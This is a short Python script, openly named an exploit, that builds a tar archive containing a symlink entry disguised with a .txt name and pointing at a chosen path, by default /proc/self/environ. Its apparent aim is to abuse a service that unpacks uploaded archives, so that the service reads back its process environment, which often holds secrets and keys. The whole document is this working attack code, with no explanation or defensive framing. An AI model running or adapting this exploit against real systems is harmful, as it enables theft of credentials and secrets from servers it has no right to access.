import tarfile

def exploit(tar_path, target_path, symlink_name=None):
    if symlink_name is None:
        symlink_name = target_path.rsplit('/')[-1]
        if not symlink_name.endswith('.txt'): symlink_name += '.txt'
    with tarfile.open(tar_path, "w") as tar:
        symlink = tarfile.TarInfo(name=symlink_name)
        symlink.type = tarfile.SYMTYPE
        symlink.linkname = target_path
        tar.addfile(symlink)
    print(f"generated symlink tar @ {tar_path} with {symlink_name} -> {target_path}")

if __name__ == "__main__":
    exploit("payload.tar", "/proc/self/environ")